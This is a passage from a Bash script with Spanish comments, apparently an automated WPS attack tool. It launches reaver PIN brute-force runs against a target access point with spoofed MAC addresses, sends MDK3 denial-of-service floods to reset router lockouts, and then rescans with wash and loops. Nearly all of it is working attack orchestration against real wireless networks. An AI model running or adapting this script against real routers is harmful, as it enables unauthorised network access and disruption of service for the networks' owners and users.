if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8h-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin  Reaver Booleanos Programa ninguna -e essid fin###

###Empezar Reaver Booleanos programa EMPEZAR con -e essid###

########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6e--no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7e-no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8e--no-dh-test12345670" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7he--no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8he-no-dh-test12345670" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$STARTPIN --session=/etc/reaver/testpin-$STARTPIN-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

}

#~~~~~~~~~~~~~fin Reaver Booleanos partir fin~~~~~~~~~~~~~~~~~#

 if [ $EVTEN -gt $RETESTPIN ]; then

       EVTEN=1

	fi


#MACSTRIP=$(echo $TARGETAP1 | tr -d -c [:xdigit:])


if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]] && [[ $EVTEN -eq 1 ]]; then

		sleep 1
		LIVE1=90
		STARTPIN_BOOLEANS_fn

		else

		R_BOOLEANS_fn

			fi

###Pin Encontrado

PINFOUND_fn


###########Empezar Determinar mantener archivo o borrar Empezar###########


#Mantenga canal viejo para MDK3 12

CHANNEL_MDK=$CHANNEL1

####Actualizar archivo de configuración####

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

#####################Empezar MDK3 DOS############################

DDOS_fn

if  [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 1 ]]; then

	echo -e " "
	echo -e "$info  Stage III DDOS Ataque Escribe $yel$MDKTYPE1$info Esta empezando"
        echo -e " "
	echo -e "$info Router Pausa / Tiempo de recuperación = $yel$PAUSE$info segundo"
        echo -e "$info REAVER Tiempo en Vivo           = $yel$LIVE1$info segundo"
	echo -e "$info MDK3 Tiempo de ataque           = $yel$MDKLIVE$info segundo"
	echo -e " "

		if  [[ $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

seconds=$MDKLIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Tiempo antes Router Recuperación y Wash exploración(Stage IV) $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

			done
				fi

		if  [[ $MDK3_COUNT == n || $MDK3_COUNT == N ]]; then

			sleep $MDKLIVE

			fi
				fi

##########DAMP_MDK=N

if [[ $DAMP_MDK == n || $DAMP_MDK == N ]]; then

	echo -e " "
	echo -e "$info  Stage III DDOS Ataque Escribe $yel$MDKTYPE1$info Esta empezando"
        echo -e " "
	echo -e "$info Router Pausa / Tiempo de recuperación = $yel$PAUSE$info segundo"
        echo -e "$info REAVER Tiempo en Vivo           = $yel$LIVE1$info segundo"
	echo -e "$info MDK3 Tiempo de ataque           = $yel$MDKLIVE$info segundo"
	echo -e " "

		if  [[ $MDK3_COUNT == y || $MDK3_COUNT == Y ]]; then

seconds=$MDKLIVE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Tiempo antes Router Recuperación y Wash exploración(Stage IV) $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

			done
				fi

		if  [[ $MDK3_COUNT == n || $MDK3_COUNT == N ]]; then

			sleep $MDKLIVE

			fi
				fi

#procesos=ps -a o ps -A
echo -e "$txtrst "
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q reaver 
killall -q mdk3
sleep 1
killall -q Eterm
killall -q tee
clear
sleep 2

### Borre los archivos de VARMAC_WASH/ carpeta ###

rm -rfv VARMAC_WASH/* &> /dev/null
clear

###fin Borre los archivos de VARMAC_WASH/ carpeta fin###

####vuelva a cargar el archivo de configuración

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

# una vez que Pixie Dust ha encontrado los archivos de configuración de anulación clave utilización de Pixiedust

if [ $PIXIE_OVERIDE == 1 ]; then

	 USE_PIXIE=n

            fi

if [[ $USE_PIXIE == y || $USE_PIXIE == y ]]; then
		echo ""	
		PDDSA_fn
		sleep 5
		fi

# Eterm -g 100x30-1+1 --cmod "red" --no-cursor  -T "wash" -e sh -c "wash -i $MON -C -s 2>&1 | tee VARMAC_WASH/wash01.txt" &

Eterm -g 100x30-1+1 --cmod "red" --no-cursor  -T "wash" -e sh -c "wash -i $MON 2>&1 | tee VARMAC_WASH/wash01.txt" &

sleep 1

######

echo ""
echo -e "$info   Para los clientes que se han visto asociados a $TARGETAP1 ver:$txtrst"
echo ""
echo -e "$txtrst  root/VARMAC_AIRCRACK/$TARGETAP1-client.txt"
echo ""
echo -e "$info   Los clientes asocian actualmente $TARGETAP1 se verá más adelante:$txtrst"
echo ""

#comprobar var no null
if [ ! -z $CLIASO_MAX ]; then

echo -e "$txtrst  $CLIASO_MAX"
echo "  $CLIASO_MID"
echo "  $CLIASO_LOW"

	else

	echo -e "$txtrst   No hay clientes están asociados actualmente $TARGETAP1"

		fi
######

	echo -e "$info " 
	echo -e "$info Router Recuperación Pausa con Wash Scan(Stage IV) Esta empezando."
	echo -e " "
	echo -e "$info Router Pausa / Tiempo de recuperación = $yel$PAUSE$info segundo"
        echo -e "$info REAVER Tiempo en Vivo                 = $yel$LIVE1$info segundo"
	echo -e "$info MDK3 Tiempo de ataque                 = $yel$MDKLIVE$info segundo"
	echo -e "$txtrst "

if  [ $WASH_COUNT == y ] || [ $WASH_COUNT == Y ]; then

seconds=$PAUSE; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info  Tiempo antes de reiniciar el programa $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 
	
	done

	fi

if  [ $WASH_COUNT == n ] || [ $WASH_COUNT == N ]; then

		sleep $PAUSE

		fi

echo -e "$txtrst "

# sleep $PAUSE
killall -q tkiptun-ng
killall -q airodump-ng
killall -q aireplay-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep 1
killall -q Eterm
clear
sleep 2

###############################fin USR Bloquear################################################

#OVERRIDE_MDK3=n

source /root/VARMAC_CONFIG/$SOURCENAME

if [ $DAMP_MDK == n ] || [ $DAMP_MDK == N ]; then

		ADVANMON=n

		fi

sleep 2

### Ponga en el canal de WASH encontrado ###

CHANNEL_LOCK=0

###fin Ponga en el canal de WASH encontrado fin###

CHANNEL_LOCK=$(cat < VARMAC_WASH/wash01.txt | awk -v mac=$TARGETAP1 -F' ' '{ if($1 == mac) {print $2}}')


if [ $CHANNEL_LOCK > "0" ]; then

         CHANNEL1=$CHANNEL_LOCK

			fi

sleep 1
rm -f /tmp/tarap02.txt
rm -f /tmp/tarap03.txt
rm -f /tmp/tarap04.txt
rm -f /tmp/tarap05.txt
rm -f /tmp/tarap06.txt
rm -f /tmp/tarap*

killall -q tkiptun-ng
killall -q airodump-ng
killall -q wash
killall -q reaver 
killall -q mdk3
sleep 1
killall -q Eterm
killall -q tput
clear
airmon-old_fn stop $MON1
sleep .1
airmon-old_fn stop $MON2
sleep .1
let COUNT=COUNT-1
let FN=FN+1

if [[ $USE_FIRSTPIN == y || $USE_FIRSTPIN == Y ]]; then

		let EVTEN=EVTEN+1

			fi

sleep 1

done

echo "bucles completado"
sleep 10
